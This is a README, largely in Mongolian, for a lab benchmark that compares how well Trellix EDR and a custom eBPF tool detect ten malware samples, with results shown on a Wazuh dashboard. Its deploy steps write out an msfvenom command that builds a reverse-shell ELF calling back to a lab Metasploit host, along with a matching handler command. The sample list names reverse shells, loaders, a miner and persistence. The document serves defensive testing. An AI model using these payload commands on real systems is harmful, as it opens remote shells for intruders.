# Trellix EDR-vs-eBPF-benchmark
EDR болон eBPF - ийн харьцуулсан судалгаа


<img width="2027" height="1164" alt="image" src="https://github.com/user-attachments/assets/51eba106-c937-4e72-b978-88de4d4b989d" />






Real-time website, Trellix EDR болон custom eBPF-ийн илрүүлэх чадварыг 10 өөр malware sample дээр side-by-side харьцуулна.

## Бүтэц

```
benchmark/
├── server/main.py         # Wazuh сервер дээрх FastAPI backend
├── agent/agent.py         # eBPF болон EDR серверүүдэд ажиллах collector
├── frontend/index.html    # Dark cyber dashboard
├── samples/               # 10 төрлийн malware sample
│   ├── 01/  EICAR
│   ├── 02/  msfvenom static ELF
│   ├── 03/  RWX shellcode loader
│   ├── 04/  XOR-encoded loader
│   ├── 05/  mprotect-based loader
│   ├── 06/  memfd_create reflective ELF
│   ├── 07/  Python ctypes injector
│   ├── 08/  Bash reverse shell
│   ├── 09/  Crypto miner stub
│   └── 10/  Cron persistence
├── install_server.sh      # Wazuh сервер дээр backend суулгах
└── install_agent.sh       # Agent сервер дээр collector суулгах
```

## Архитектур

```
                    Browser (https)
                          │
           https://wazuh.datacenter.gov.mn/benchmark/
                          │
                       Nginx
                          │
                   127.0.0.1:8765
                  FastAPI backend
              (alerts.json tail хийнэ)
                          │
                  ┌───────┴───────┐
                  │ ws://         │
                  │  :8765        │
        ┌─────────┴────┐   ┌──────┴────────┐
        │ ebpf agent   │   │ edr agent     │
        │ 10.52.1.57   │   │ 10.52.1.62    │
        │ /opt/samples │   │ /opt/samples  │
        └──────────────┘   └───────────────┘
```

## Deploy

### 1. Энэ folder-ийг бүх 3 серверт хуулах

```bash
tar czf benchmark.tar.gz benchmark/
scp benchmark.tar.gz root@10.52.1.118:/root/  # Wazuh
scp benchmark.tar.gz root@10.52.1.57:/root/   # eBPF
scp benchmark.tar.gz root@10.52.1.62:/root/   # EDR
```

Сервер бүр дээр:
```bash
cd /root && tar xzf benchmark.tar.gz && cd benchmark
```

### 2. Wazuh сервер (10.52.1.118)

```bash
sudo bash install_server.sh
```

Энэ нь:
- Python venv үүсгэж dependency суулгана
- `/opt/benchmark/` дотор код суулгана
- `benchmark-server` systemd service эхлүүлнэ
- Nginx-д `/benchmark/` location нэмнэ
- UFW дээр 8765 портыг 10.52.1.0/24-аас зөвшөөрнө

### 3. Metasploit сервер (10.52.1.66) — payload бэлдэх

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.52.1.66 LPORT=4444 \
  -f elf -o /tmp/payload.elf

scp /tmp/payload.elf root@10.52.1.57:/opt/samples/02/
scp /tmp/payload.elf root@10.52.1.62:/opt/samples/02/

# Listener асаах
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 10.52.1.66; set LPORT 4444; exploit -j"
```

### 4. eBPF сервер (10.52.1.57)

```bash
cd /root/benchmark
sudo AGENT_KEY=ebpf bash install_agent.sh
```

### 5. EDR сервер (10.52.1.62)

```bash
cd /root/benchmark
sudo AGENT_KEY=edr bash install_agent.sh
```

### 6. Туршиж үзэх

Browser:
```
https://wazuh.datacenter.gov.mn/benchmark/
```

Хүлээгдэж буй харагдац:
- 2 agent-ын dot ногоон болсон (online)
- CPU/RAM live chart 1 сек тутамд шинэчлэгдэх
- Sample dropdown-аас сонгож "RUN" дарахад хоёр сервер дээр зэрэг sample run болно
- Detection latency, alert level, winner real-time харагдана

## Wazuh rule

`/var/ossec/etc/rules/local_rules.xml`-д аль хэдийн орсон байгаа:
- 100100-100103: RWX Hunter (ebpf agent)
- 100200-100204: Trellix (edr agent)

## Алдааны үед

**Backend log:**
```bash
journalctl -u benchmark-server -f
```

**Agent log:**
```bash
journalctl -u benchmark-agent -f
```

**Agent холбогдохгүй байвал:**
```bash
# 8765 порт нээлттэй эсэх
nc -zv 10.52.1.118 8765

# UFW
sudo ufw allow from 10.52.1.0/24 to any port 8765 proto tcp
```

**Detect ирэхгүй байвал:**
```bash
# Wazuh alerts.json өсөж байгаа эсэх
sudo tail -f /var/ossec/logs/alerts/alerts.json | grep -E "rwx_hunter|trellix"

# Backend permission
sudo -u root cat /var/ossec/logs/alerts/alerts.json | head
```

## Анхааруулга

```
- 3 ширхэг Ubuntu 22.04 LTS сервер
- Wazuh 4.14+ manager
- Trellix Endpoint Security 10.7 (эсвэл өөр EDR)
- Linux kernel 5.15+ (eBPF tracepoint-уудад)
- BCC tools 0.30+
- Python 3.10+
- Node.js 18+ (frontend hosting шаардлагагүй)

## Тайлбар

Энэхүү код нь тодорхой lab орчинд (10.52.1.0/24 subnet) бичигдсэн.
Өөр орчинд ажиллуулахын тулд:
- server/main.py доторх AGENTS dict-д IP-уудыг солих
- samples/*/run.sh-ийн LHOST-уудыг өөрчлөх
- Wazuh custom rule (rules/local_rules.xml) нэмэх        
```




